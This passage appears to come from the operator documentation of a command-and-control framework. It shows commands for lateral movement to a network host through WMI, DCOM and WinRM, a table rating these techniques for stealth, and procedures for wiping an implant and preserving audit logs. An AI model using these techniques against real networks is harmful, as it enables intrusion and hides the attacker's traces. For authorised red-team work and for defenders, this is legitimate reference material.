orchestra-console send --agent DESKTOP-WIN10 --command WmiExec \
  --args '{"target":"192.168.1.50","command":"whoami"}'

# DCOM execution
orchestra-console send --agent DESKTOP-WIN10 --command DcomExec \
  --args '{"target":"192.168.1.50","clsid":"{4991D34B-80A1-4291-83B6-A33FC0612B25}","command":"cmd.exe /c whoami"}'

# WinRM execution
orchestra-console send --agent DESKTOP-WIN10 --command WinRmExec \
  --args '{"target":"192.168.1.50","command":"whoami"}'
```

**Technique comparison:**

| Technique | Protocol | Stealth | Prerequisites |
|-----------|----------|---------|--------------|
| **PsExec** | SMB + Service Control Manager | Low (creates service) | Admin credentials |
| **WMI** | DCOM/WMI | Medium (no service creation) | Admin credentials, WMI enabled |
| **DCOM** | DCOM | Medium (varies by CLSID) | Admin credentials, DCOM enabled |
| **WinRM** | HTTP/WSMAN | Medium | Admin credentials, WinRM enabled |

**All lateral movement commands require the agent to run on Windows. No PowerShell is used.**

---

## 23. Emergency Procedures

### Agent Self-Destruct

If an agent is detected or compromised:

```bash
orchestra-console send --agent DESKTOP-WIN10 --command Shutdown
```

The agent will:
1. Disable persistence
2. Unload all modules
3. Zero all memory regions
4. Terminate cleanly

### Server Emergency Shutdown

```bash
# Graceful shutdown (notifies agents)
kill -SIGTERM $(pidof orchestra-server)

# Immediate shutdown (use with caution)
kill -SIGKILL $(pidof orchestra-server)
```

### Audit Log Preservation

Before any emergency action:

```bash
# Immediately export audit logs
orchestra-server export-audit --output /secure/location/audit-$(date +%Y%m%d-%H%M%S).jsonl
```

---

## See Also

- [MALLEABLE_PROFILES.md](MALLEABLE_PROFILES.md) — Complete profile reference
- [INJECTION_ENGINE.md](INJECTION_ENGINE.md) — Injection techniques
- [SLEEP_OBFUSCATION.md](SLEEP_OBFUSCATION.md) — Sleep obfuscation pipeline
- [REDIRECTOR_GUIDE.md](REDIRECTOR_GUIDE.md) — Redirector deployment
- [ARCHITECTURE.md](ARCHITECTURE.md) — Internal architecture
- [SECURITY.md](SECURITY.md) — Security considerations
- [FEATURES.md](FEATURES.md) — Feature flag reference
- [QUICKSTART.md](QUICKSTART.md) — Getting started guide
- [P2P_MESH.md](P2P_MESH.md) — P2P mesh protocol and topology
- [USER_GUIDE.md](USER_GUIDE.md) — End-user guide
